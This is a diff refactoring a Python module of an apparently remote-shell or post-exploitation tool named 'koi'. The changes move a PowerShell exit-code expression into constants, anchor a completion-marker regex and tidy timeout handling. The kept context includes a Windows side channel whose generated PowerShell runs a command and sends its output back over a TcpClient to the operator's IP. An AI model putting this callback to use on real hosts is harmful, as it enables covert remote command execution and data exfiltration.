@@ -28,6 +28,8 @@ from koi.utils.tcp import (
 import argparse
 
 _PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
+_PS_RC_EXPR = "$(if($null-ne $LASTEXITCODE){$LASTEXITCODE}elseif(!$?){1}else{0})"
+_PS_RC_ASSIGN = "if($null-ne $LASTEXITCODE){$LASTEXITCODE}elseif(!$?){1}else{0}"
 
 _ECHO_PREAMBLE_LINES = 8
 _SELECT_TIMEOUT = 0.1
@@ -582,10 +584,9 @@ class KoiModule(ABC):
             return self._exec_win_sidechannel(command, timeout, _silent)
 
         marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
-        done_re = re.compile(rf"{re.escape(marker)}:(-?\d+)")
+        done_re = re.compile(rf"^{re.escape(marker)}:(-?\d+)$")
 
-        rc_expr = "$(if($null-ne $LASTEXITCODE){$LASTEXITCODE}elseif(!$?){1}else{0})"
-        ps_inner = f"& {{ {command} }}; ''; '{marker}:' + {rc_expr}"
+        ps_inner = f"& {{ {command} }}; ''; '{marker}:' + {_PS_RC_EXPR}"
 
         if self.session.os_type == "windows_ps":
             cmd = ps_inner
@@ -598,8 +599,8 @@ class KoiModule(ABC):
         self.session.conn.sendall((cmd + eol).encode(enc))
 
         started = time.monotonic()
+        deadline = started + timeout
         buf = b""
-        deadline = time.monotonic() + timeout
         output_lines: List[str] = []
         output_bytes = 0
         truncated = False
@@ -624,8 +625,8 @@ class KoiModule(ABC):
                 text = _PS_PROMPT.sub("", text).strip()
                 if not text:
                     continue
-                if done_re.search(text) and marker == text[:len(marker)]:
-                    returncode = int(done_re.search(text).group(1))
+                if match := done_re.match(text):
+                    returncode = int(match.group(1))
                     return self._build_result(
                         command, returncode, output_lines, started, _silent,
                     )
@@ -652,12 +653,11 @@ class KoiModule(ABC):
         marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
         done_re = re.compile(rf"{re.escape(marker)}:(-?\d+)")
         local_ip = self._get_local_ip()
-        rc_expr = "if($null-ne $LASTEXITCODE){$LASTEXITCODE}elseif(!$?){1}else{0}"
 
         with TCPReceiveServer(timeout=timeout) as srv:
             ps_cmd = (
                 f"$_r=(& {{ {command} }}) 2>&1 | Out-String;"
-                f"$_rc={rc_expr};"
+                f"$_rc={_PS_RC_ASSIGN};"
                 f"$_o=$_r.Trim()+\"`n{marker}:$_rc\";"
                 f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{srv.port});"
                 f"$_s=$_c.GetStream();"
